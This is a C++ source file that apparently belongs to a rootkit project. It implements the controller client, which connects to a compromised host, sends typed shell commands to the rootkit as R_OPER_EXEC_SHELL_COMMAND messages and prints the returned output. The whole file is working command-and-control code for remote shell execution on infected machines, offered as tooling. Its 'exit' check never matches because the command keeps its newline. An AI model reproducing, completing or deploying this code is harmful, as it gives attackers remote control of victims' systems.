//
// Created by idan on 1/21/24.
//

#include "remote_control_client.h"

#include <iostream>
#include <cstring>

#include "../network_access/linux_client.h"

#include "msg_to_rootkit.h"
#include "msg_to_controller.h"

void remote_control_client::run() {

    linux_client client(server_port, server_addr);

    client.connect();

    while (1) {
        // todo: currently just only uses R_OPER_EXEC_SHELL_COMMAND

        std::string command;
        while (1) {
            char ch = getchar();
            command += ch;

            if (ch == '\n')
                break;
        }
        if (command == "exit")
            break;

// send command
        struct msg_to_rootkit msg;
        memset(&msg, '\x00', sizeof(struct msg_to_rootkit));
        msg.id = R_OPER_EXEC_SHELL_COMMAND;
        memcpy(msg.data, command.c_str(), std::min(command.length(), (size_t) MAX_MSG_TO_ROOTKIT_SZ));

//        if (client.send_data(reinterpret_cast<const char *>(&msg), sizeof(struct msg_to_rootkit)) !=
//            sizeof(struct msg_to_rootkit)) {
//            std::cout << "message wasn't fully sent" << std::endl;
//            continue;
//        }
        client.send_data(reinterpret_cast<const char *>(&msg), sizeof(struct msg_to_rootkit));
        std::cout << "sent message" << std::endl;

// receive output
        struct msg_to_controller msg_back;
        memset(&msg_back, '\x00', sizeof(struct msg_to_controller));
        client.recv_data(reinterpret_cast<char *>(&msg_back), sizeof(struct msg_to_controller));

        std::cout << "received data:" << std::endl;
        std::cout << msg_back.data << std::endl;
//        std::cout.flush();
    }

    client.disconnect();

}

